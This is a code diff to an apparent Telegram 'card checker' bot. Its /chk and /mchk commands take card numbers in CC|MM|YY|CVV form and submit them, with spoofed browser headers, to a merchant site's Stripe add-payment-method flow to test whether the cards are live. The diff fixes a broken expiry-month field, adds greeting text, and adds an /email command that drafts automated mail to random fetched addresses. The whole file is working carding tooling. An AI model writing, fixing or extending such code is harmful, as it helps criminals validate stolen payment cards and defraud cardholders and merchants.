@@ -4,8 +4,9 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 import json
 import time
-from datetime import datetime
+import requests
 import logging
+from datetime import datetime
 
 # Configure logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
@@ -57,7 +58,7 @@ async def ppc(cards):
                 "accept-language": "en-US,en;q=0.9",
                 "cache-control": "max-age=0",
                 "priority": "u=0, i",
-                "referer": f"{DOMAIN}/my-account/add-payment-method/",
+                "referer": f"{DOMAIN}/my-account/payment-methods/",
                 "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                 "sec-ch-ua-mobile": "?0",
                 "sec-ch-ua-platform": '"Windows"',
@@ -100,7 +101,7 @@ async def ppc(cards):
                 "card[number]": f"{cc}",
                 "card[cvc]": f"{cvv}",
                 "card[exp_year]": f"{year}",
-                "card[exp_month": f"{mon}",
+                "card[exp_month]": f"{mon}",
                 "allow_redisplay": "unspecified",
                 "billing_details[address][postal_code]": "99501",
                 "billing_details[address][country]": "US",
@@ -170,11 +171,12 @@ async def cmds(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "Available commands:\n"
         "/cmds - Show this help message\n"
         "/chk <card> - Check a single card (format: CC|MM|YY|CVV)\n"
-        "/mchk <cards> - Check multiple cards (up to 10, one per line or space-separated, format: CC|MM|YY|CVV)"
+        "/mchk <cards> - Check multiple cards (up to 10, one per line or space-separated, format: CC|MM|YY|CVV)\n"
+        "/email - Generate an automatic email draft with random recipients"
     )
 
 async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check a single credit card."""
+    """Check a single credit card with greeting."""
     start_time = time.time()
     user = update.effective_user
     if not context.args:
@@ -182,6 +184,9 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     card = " ".join(context.args).strip()
+    # Generate or retrieve greeting
+    greeting = await get_or_generate_greeting(context, 1)
+    
     try:
         result = await ppc(card)
         try:
@@ -197,6 +202,7 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         elapsed_time = round(time.time() - start_time, 2)
 
         response = (
+            f"{greeting}\n"
             f"[ϟ] 𝗖𝗖 - {card}\n"
             f"[ϟ] 𝗦𝘁𝗮𝘁𝘂𝘀 : {status}\n"
             f"[ϟ] 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : {reason}\n"
@@ -216,7 +222,7 @@ async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"Error: {str(e)}")
 
 async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check multiple credit cards (up to 10)."""
+    """Check multiple credit cards (up to 10) with greeting."""
     start_time = time.time()
     user = update.effective_user
     if not context.args:
@@ -230,7 +236,11 @@ async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("No valid cards provided.")
         return
 
+    # Generate or retrieve greeting based on number of cards
+    greeting = await get_or_generate_greeting(context, len(cards))
+    
     response = (
+        f"{greeting}\n"
         f"<b>🎯 MASS STRIPE AUTH</b>\n"
         f"<b>📊 Limit Used:</b> {len(cards)} / 10\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -278,6 +288,69 @@ async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(response, parse_mode="HTML")
 
+async def email(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Generate an automatic email draft with random recipients."""
+    user = update.effective_user
+    # Fetch 3 random users (adjust number as needed)
+    url = "https://randomuser.me/api/?results=3&inc=name,email"
+    response = requests.get(url)
+    if response.status_code == 200:
+        data = response.json()
+        users = data['results']
+        names = [f"{user['name']['first']} {user['name']['last']}" for user in users]
+        emails = [user['email'] for user in users]
+
+        if len(names) == 1:
+            greeting = f"Hello {names[0]},"
+        elif len(names) == 2:
+            greeting = f"Hello {names[0]} and {names[1]},"
+        else:
+            greeting = f"Hello {', '.join(names[:-1])}, and {names[-1]},"
+
+        email_body = (
+            f"{greeting}\n\n"
+            f"Dear {', '.join(names)},\n\n"
+            f"This is an automated email generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} IST.\n"
+            f"Please find the details below:\n"
+            f"- Sender: {user.first_name} [Free User]\n"
+            f"- Purpose: Automated Request\n"
+            f"- Contact: Reply to this message for assistance.\n\n"
+            f"Best regards,\n"
+            f"Bunnyke Team\n"
+        )
+        await update.message.reply_text(
+            f"Email Draft:\n"
+            f"To: {', '.join(emails)}\n"
+            f"Subject: Automated Request\n\n"
+            f"{email_body}",
+            parse_mode="HTML"
+        )
+    else:
+        await update.message.reply_text("Failed to generate email draft. Please try again later.")
+
+async def get_or_generate_greeting(context: ContextTypes.DEFAULT_TYPE, num_users: int):
+    """Get existing greeting from context or generate a new one."""
+    # Check if greeting is already in context memory
+    if "greeting" in context.user_data:
+        return context.user_data["greeting"]
+    
+    # Generate new greeting if not present
+    url = f"https://randomuser.me/api/?results={num_users}&inc=name"
+    response = requests.get(url)
+    if response.status_code == 200:
+        data = response.json()
+        users = data['results']
+        names = [f"{user['name']['first']} {user['name']['last']}" for user in users]
+        if len(names) == 1:
+            greeting = f"Hello {names[0]},"
+        elif len(names) == 2:
+            greeting = f"Hello {names[0]} and {names[1]},"
+        else:
+            greeting = f"Hello {', '.join(names[:-1])}, and {names[-1]},"
+        context.user_data["greeting"] = greeting  # Store in memory
+        return greeting
+    return "Hello everyone,"
+
 def main():
     """Start the Telegram bot with proper event loop handling."""
     application = Application.builder().token(TOKEN).build()
@@ -285,6 +358,7 @@ def main():
     application.add_handler(CommandHandler("cmds", cmds))
     application.add_handler(CommandHandler("chk", chk))
     application.add_handler(CommandHandler("mchk", mchk))
+    application.add_handler(CommandHandler("email", email))
 
     application.run_polling()
 
